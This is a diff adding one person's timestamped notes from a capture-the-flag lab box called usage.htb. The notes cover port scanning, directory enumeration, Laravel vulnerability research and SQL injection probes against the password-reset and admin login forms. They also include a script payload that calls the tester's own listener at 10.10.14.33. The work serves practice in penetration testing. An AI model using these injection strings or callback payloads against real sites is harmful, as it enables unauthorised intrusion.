@@ -1,0 +1,80 @@
+2024-04-23 Tue 07:03 PM IP is 10.10.11.18
+2024-04-23 Tue 07:03 PM `nmap -Pn -F 10.10.11.18` yields ssh and http open
+2024-04-23 Tue 07:04 PM `curl http://10.10.11.18:80` shows a 301 moved
+2024-04-23 Tue 07:05 PM server is running nginx/1.18.0 - is this latest? No
+nginx 1.25.4 is latest
+2024-04-23 Tue 07:06 PM Searching for vulns for nginx/1.18.0
+2024-04-23 Tue 07:07 PM `sudo msfdb start` to start database
+2024-04-23 Tue 07:07 PM https://github.com/nginxinc/docker-nginx/issues/474
+shows vulns but doesn't seem relevant
+2024-04-23 Tue 07:18 PM Back to the site - 301 moved to usage.htb yields
+a NS_ERROR_UNKNOWN_HOST - edited /etc/hosts to include `10.10.11.18 usage.htb`
+
+
+--- SITE ---
+2024-04-23 Tue 07:20 PM there's a login with email and password
+2024-04-23 Tue 07:20 PM Exploring the page, there is a "Register" tab and an
+"Admin" tab
+2024-04-23 Tue 07:20 PM running `dirsearch -u http://usage.htb`
+2024-04-23 Tue 07:23 PM Inspecting the HTML shows <input type="hidden"
+name="_token" value="pQmVuxExpeXrArNpIc8yemPpEbyymbKpz6Ty5x4">  ... interesting
+2024-04-23 Tue 07:27 PM Setting up a burpsuite proxy
+
+--- Input injection ---
+2024-04-23 Tue 07:30 PM Testing SQL injection - no dice
+2024-04-23 Tue 07:40 PM The document shows a cookie `larevel_session`. Larevel
+is a PHP framework. Metaspoilt `search laravel` reveals Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to
+  an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.
+  Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.
+2024-04-23 Tue 07:43 PM Searching on SNYK
+https://security.snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-5462002 we can
+potentially enumerate usernames. This would require a list of usernames to test
+with, and since we cannot seem to find any OSINT on this page indicating
+possible users, that doesn't seem like the right approach.
+2024-04-23 Tue 07:47 PM
+https://security.snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-2312868 XSS is also an
+option
+2024-04-23 Tue 07:48 PM https://brightsec.com/blog/cross-site-scripting-php/ 
+2024-04-23 Tue 07:49 PM Let's try just running a local listener `python3 -m
+http.server 8001`
+
+2024-04-23 Tue 07:57 PM On the /forgot-password page we do get a 500 server
+error if we put the email as `=' OR 1=1;
+
+--- REGISTRATION ---
+2024-04-23 Tue 08:00 PM I guess we didn't try registering... username:
+lisa.simpson@example.com, password: asdf123
+2024-04-23 Tue 08:03 PM The site itself shows blogs telling us what we already
+know - it is using Laravel PHP and talks a lot about Server-Side Language Pen
+testing
+
+--- ADMIN PAGE ---
+2024-04-23 Tue 08:10 PM If we add admin.usage.htb to /etc/hosts we get an admin
+login page. Inputs to this seem to yield a 419 page expired.
+2024-04-23 Tue 08:10 PM Upon searching, this is a Laravel specific error when
+the CSRF token is not valid
+2024-04-23 Tue 08:16 PM Let's start by seeing if we can reach our server from
+their server
+
+Payload:
+```
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "http://10.10.14.33:8001");
+  xhr.send();
+</script>
+``` (URL encoded and passed as the username for the admin login)
+No luck
+
+2024-04-23 Tue 08:27 PM Back to the forget-password page. I wonder if we can
+get the users table
+2024-04-23 Tue 08:32 PM On admin page: username ' OR 1=1;-- yields "These
+credentials do not match our records" rather than a 419
+
+2024-04-23 Tue 08:59 PM on /forget-password page, lisa.simpson@example.com'--
+throws a 500 but lisa.simpson@example.com' OR '1'='1  shows me a message "We
+have emailed your password reset link to lisa.simpson@example.com' OR '1'='1
+2024-04-23 Tue 09:01 PM '; SELECT * FROM information_schema.tables;-- also
+yields a 500
+
+--- STOPPING FOR NOW --- 
